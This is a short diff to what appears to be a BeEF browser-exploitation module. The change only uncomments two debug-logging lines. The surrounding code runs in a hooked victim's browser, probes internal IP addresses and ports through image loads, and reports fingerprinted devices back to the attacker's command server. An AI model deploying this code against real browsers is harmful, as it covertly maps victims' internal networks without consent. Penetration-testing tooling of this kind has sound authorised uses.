@@ -219,7 +219,7 @@ beef.execute(function() {
 		for(var u=0; u < urls.length; u++) {
 			if(!urls[u][3] && ports != null){ // use default port
 				var img = new Image;
-				//beef.debug("Detecting  [" + urls[u][0] + "] at IP [" + ips[i] + "]");
+				beef.debug("Detecting  [" + urls[u][0] + "] at IP [" + ips[i] + "]");
 				img.id  = u;
 				img.src = urls[u][2]+"://"+ips[i]+":"+urls[u][1]+urls[u][4];
 				img.onload = function() { if (this.width == urls[this.id][5] && this.height == urls[this.id][6]) { beef.net.send('<%= @command_url %>', <%= @command_id %>,'discovered='+escape(urls[this.id][0])+"&url="+escape(this.src));dom.removeChild(this); } }
@@ -227,7 +227,7 @@ beef.execute(function() {
 			} else { // iterate to all the specified ports
 				for(p=0;p<ports.length;p++){
 					var img = new Image;
-					//beef.debug("Detecting  [" + urls[u][0] + "] at IP [" + ips[i] + "], port [" + ports[p] + "]");
+					beef.debug("Detecting  [" + urls[u][0] + "] at IP [" + ips[i] + "], port [" + ports[p] + "]");
 					img.id  = u;
 					img.src = urls[u][2]+"://"+ips[i]+":"+ports[p]+urls[u][4];
 					img.onload = function() { if (this.width == urls[this.id][5] && this.height == urls[this.id][6]) { beef.net.send('<%= @command_url %>', <%= @command_id %>,'discovered='+escape(urls[this.id][0])+"&url="+escape(this.src));dom.removeChild(this); } }
